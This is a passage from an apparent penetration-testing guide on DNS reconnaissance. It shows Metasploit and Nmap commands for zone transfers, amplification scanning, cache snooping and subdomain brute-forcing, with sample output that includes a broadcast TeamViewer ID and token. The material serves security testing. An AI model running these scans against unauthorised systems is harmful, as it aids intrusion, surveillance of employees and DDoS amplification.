<span class="n">F</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">32.047746</span> <span class="c1">#15019] FATAL -- : No response from nameservers list: aborting</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Zone</span> <span class="n">transfer</span> <span class="n">failed</span> <span class="p">(</span><span class="n">length</span> <span class="n">was</span> <span class="n">zero</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">nameserver</span><span class="p">:</span> <span class="n">nsztm1</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">33.269318</span> <span class="c1">#15019]  WARN -- : AXFR query, switching to TCP</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">33.804121</span> <span class="c1">#15019]  WARN -- : Error parsing axfr response: undefined method `+&#39; for nil:NilClass</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">48.481319</span> <span class="c1">#15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one</span>
<span class="n">F</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">48.481519</span> <span class="c1">#15019] FATAL -- : No response from nameservers list: aborting</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Zone</span> <span class="n">transfer</span> <span class="n">failed</span> <span class="p">(</span><span class="n">length</span> <span class="n">was</span> <span class="n">zero</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerating</span> <span class="n">SRV</span> <span class="n">records</span> <span class="k">for</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SRV</span> <span class="n">Record</span><span class="p">:</span> <span class="n">_sip</span><span class="o">.</span><span class="n">_tcp</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span> <span class="n">Host</span><span class="p">:</span> <span class="n">www</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">5060</span> <span class="n">Priority</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
<p>Two interesting metasploit modules which we found are</p>
</div>
<div class="section" id="dns-amplification-scanner">
<h4>DNS Amplification Scanner<a class="headerlink" href="#dns-amplification-scanner" title="Permalink to this headline">¶</a></h4>
<p>Tests for the DNS Amplification Tests.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">dns</span><span class="o">/</span><span class="n">dns_amp</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">53</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="mi">67</span> <span class="nb">bytes</span> <span class="n">to</span> <span class="n">each</span> <span class="n">host</span> <span class="n">using</span> <span class="n">the</span> <span class="n">IN</span> <span class="n">ANY</span> <span class="n">isc</span><span class="o">.</span><span class="n">org</span> <span class="n">request</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">53</span> <span class="o">-</span> <span class="n">Response</span> <span class="ow">is</span> <span class="mi">401</span> <span class="nb">bytes</span> <span class="p">[</span><span class="mf">5.99</span><span class="n">x</span> <span class="n">Amplification</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">53</span> <span class="o">-</span> <span class="n">Response</span> <span class="ow">is</span> <span class="mi">417</span> <span class="nb">bytes</span> <span class="p">[</span><span class="mf">6.22</span><span class="n">x</span> <span class="n">Amplification</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">53</span> <span class="o">-</span> <span class="n">Response</span> <span class="ow">is</span> <span class="mi">401</span> <span class="nb">bytes</span> <span class="p">[</span><span class="mf">5.99</span><span class="n">x</span> <span class="n">Amplification</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">53</span> <span class="o">-</span> <span class="n">Response</span> <span class="ow">is</span> <span class="mi">230</span> <span class="nb">bytes</span> <span class="p">[</span><span class="mf">3.43</span><span class="n">x</span> <span class="n">Amplification</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-non-recursive-record-scraper">
<h4>DNS Non-Recursive Record Scraper<a class="headerlink" href="#dns-non-recursive-record-scraper" title="Permalink to this headline">¶</a></h4>
<p>Can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">dns_cache_scraper</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Making</span> <span class="n">queries</span> <span class="n">against</span> <span class="mf">103.8</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">dnl</span><span class="o">-</span><span class="mf">01.</span><span class="n">geo</span><span class="o">.</span><span class="n">kaspersky</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">downloads2</span><span class="o">.</span><span class="n">kaspersky</span><span class="o">-</span><span class="n">labs</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">liveupdate</span><span class="o">.</span><span class="n">symantecliveupdate</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">liveupdate</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">update</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">update</span><span class="o">.</span><span class="n">nai</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">guru</span><span class="o">.</span><span class="n">avg</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="n">Found</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id7">
<h3>Nmap<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
<p>Nmap has around 19-20 NSE Scripts for DNS, we haven&#8217;t mentioned all the NSE here, only which we were able to use.:</p>
<div class="section" id="broadcast-dns-service-discovery">
<h4>Broadcast-dns-service-discovery<a class="headerlink" href="#broadcast-dns-service-discovery" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html">broadcast-dns-service-discovery.nse</a> : Attempts to discover hosts&#8217; services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">broadcast</span><span class="o">-</span><span class="n">dns</span><span class="o">-</span><span class="n">service</span><span class="o">-</span><span class="n">discovery</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">12</span> <span class="mi">14</span><span class="p">:</span><span class="mi">53</span> <span class="n">IST</span>
<span class="n">Pre</span><span class="o">-</span><span class="n">scan</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">broadcast</span><span class="o">-</span><span class="n">dns</span><span class="o">-</span><span class="n">service</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span>
<span class="o">|</span>   <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="mi">9</span><span class="o">/</span><span class="n">tcp</span> <span class="n">workstation</span>
<span class="o">|</span>       <span class="n">Address</span><span class="o">=</span><span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">fe80</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mf">3e97</span><span class="p">:</span><span class="n">eff</span><span class="p">:</span><span class="n">fe9a</span><span class="p">:</span><span class="mi">51</span><span class="n">b</span>
<span class="o">|</span>     <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">udisks</span><span class="o">-</span><span class="n">ssh</span>
<span class="o">|</span>       <span class="n">Address</span><span class="o">=</span><span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">fe80</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mf">3e97</span><span class="p">:</span><span class="n">eff</span><span class="p">:</span><span class="n">fe9a</span><span class="p">:</span><span class="mi">51</span><span class="n">b</span>
<span class="o">|</span>   <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="mi">2020</span><span class="o">/</span><span class="n">tcp</span> <span class="n">teamviewer</span>
<span class="o">|</span>       <span class="n">DyngateID</span><span class="o">=</span><span class="mi">164005815</span>
<span class="o">|</span>       <span class="n">Token</span><span class="o">=</span><span class="n">CrzebHH5rkzIEBsP</span>
<span class="o">|</span>       <span class="n">UUID</span><span class="o">=</span><span class="mf">119e36</span><span class="n">d8</span><span class="o">-</span><span class="mi">4366</span><span class="o">-</span><span class="mi">4495</span><span class="o">-</span><span class="mf">9e13</span><span class="o">-</span><span class="n">c44be02851f0</span>
<span class="o">|</span><span class="n">_</span>      <span class="n">Address</span><span class="o">=</span><span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">fe80</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">69</span><span class="n">ab</span><span class="p">:</span><span class="mi">44</span><span class="n">d5</span><span class="p">:</span><span class="n">e21d</span><span class="p">:</span><span class="mi">738</span><span class="n">e</span>
<span class="n">WARNING</span><span class="p">:</span> <span class="n">No</span> <span class="n">targets</span> <span class="n">were</span> <span class="n">specified</span><span class="p">,</span> <span class="n">so</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">scanned</span><span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">0</span> <span class="n">IP</span> <span class="n">addresses</span> <span class="p">(</span><span class="mi">0</span> <span class="n">hosts</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">7.24</span> <span class="n">seconds</span>
</pre></div>
</div>
<p>It&#8217;s surprising why teamviewer will broadcast it&#8217;s ID, then we mostly need 4 digit pin just to control the machine.</p>
</div>
<div class="section" id="dns-blacklist">
<h4>DNS-blacklist<a class="headerlink" href="#dns-blacklist" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-blacklist.html">dns-blacklist.nse</a> ( External IP Only ) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged</p>
</div>
<div class="section" id="dns-brute">
<h4>DNS-brute<a class="headerlink" href="#dns-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-brute.html">dns-brute.nse</a> : This is similar to the msf dns_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">brute</span> <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span> <span class="mi">23</span><span class="p">:</span><span class="mi">23</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="o">.</span>
<span class="n">Other</span> <span class="n">addresses</span> <span class="k">for</span> <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="ow">not</span> <span class="n">scanned</span><span class="p">):</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">::</span><span class="mi">7432</span><span class="p">:</span><span class="mi">4</span><span class="n">fd0</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">brute</span><span class="p">:</span>
<span class="o">|</span>   <span class="n">DNS</span> <span class="n">Brute</span><span class="o">-</span><span class="n">force</span> <span class="n">hostnames</span><span class="p">:</span>
<span class="o">|</span>     <span class="n">mx1</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">cbc7</span><span class="p">:</span><span class="mi">2989</span>
<span class="o">|</span>     <span class="n">images</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">images</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mi">404</span><span class="n">b</span>
<span class="o">|</span>     <span class="n">dns</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">dns</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mf">42e6</span>
<span class="o">|</span>     <span class="n">web</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">203.199</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">web</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">cbc7</span><span class="p">:</span><span class="mi">2911</span>
<span class="o">|</span>     <span class="n">exchange</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">203.199</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">mail</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">exchange</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">cbc7</span><span class="p">:</span><span class="mi">29</span><span class="n">a7</span>
<span class="o">|</span>     <span class="n">mail</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mi">4</span><span class="n">fe7</span>
<span class="o">|</span>     <span class="n">blog</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">blog</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mi">4</span><span class="n">ebb</span>
<span class="o">|</span>     <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mi">4</span><span class="n">fd0</span>
<span class="o">|</span>     <span class="n">sip</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">sip</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">sip</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mf">4e56</span>
<span class="o">|</span>     <span class="n">sip</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mi">4</span><span class="n">ec9</span>
<span class="o">|</span>     <span class="n">mobile</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mf">116.50</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">mobile</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">7432</span><span class="p">:</span><span class="mf">4e18</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">7.02</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-cache-snoop">
<h4>DNS-Cache-snoop<a class="headerlink" href="#dns-cache-snoop" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html">dns-cache-snoop.nse</a> : This module is similar to dns_cache_scraper. Performs DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with &#8220;www.&#8221; and once without. Use the dns-cache-snoop.domains script argument to use a different list.</p>
<p>Sample Output with no arguments:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">53</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">cache</span><span class="o">-</span><span class="n">snoop</span><span class="o">.</span><span class="n">nse</span> <span class="mf">103.8</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span> <span class="mi">23</span><span class="p">:</span><span class="mi">30</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">ns5</span><span class="o">.</span><span class="n">xxxxxx</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="ow">in</span> <span class="p">(</span><span class="mf">103.8</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.067</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">domain</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">cache</span><span class="o">-</span><span class="n">snoop</span><span class="p">:</span> <span class="mi">83</span> <span class="n">of</span> <span class="mi">100</span> <span class="n">tested</span> <span class="n">domains</span> <span class="n">are</span> <span class="n">cached</span><span class="o">.</span>
<span class="o">|</span> <span class="n">google</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">www</span><span class="o">.</span><span class="n">google</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">facebook</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">www</span><span class="o">.</span><span class="n">facebook</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">youtube</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">www</span><span class="o">.</span><span class="n">youtube</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">yahoo</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">www</span><span class="o">.</span><span class="n">yahoo</span><span class="o">.</span><span class="n">com</span>
</pre></div>
</div>
<p>Sample Output with custom list of websites:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">53</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">cache</span><span class="o">-</span><span class="n">snoop</span><span class="o">.</span><span class="n">nse</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="s1">&#39;dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}&#39;</span> <span class="mf">103.8</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span> <span class="mi">23</span><span class="p">:</span><span class="mi">33</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">ns5</span><span class="o">.</span><span class="n">tataidc</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="ow">in</span> <span class="p">(</span><span class="mf">103.8</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.11</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">domain</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">cache</span><span class="o">-</span><span class="n">snoop</span><span class="p">:</span> <span class="mi">2</span> <span class="n">of</span> <span class="mi">3</span> <span class="n">tested</span> <span class="n">domains</span> <span class="n">are</span> <span class="n">cached</span><span class="o">.</span>
<span class="o">|</span> <span class="n">dnl</span><span class="o">-</span><span class="mf">01.</span><span class="n">geo</span><span class="o">.</span><span class="n">kaspersky</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span><span class="n">_update</span><span class="o">.</span><span class="n">symantec</span><span class="o">.</span><span class="n">com</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-check-zone">
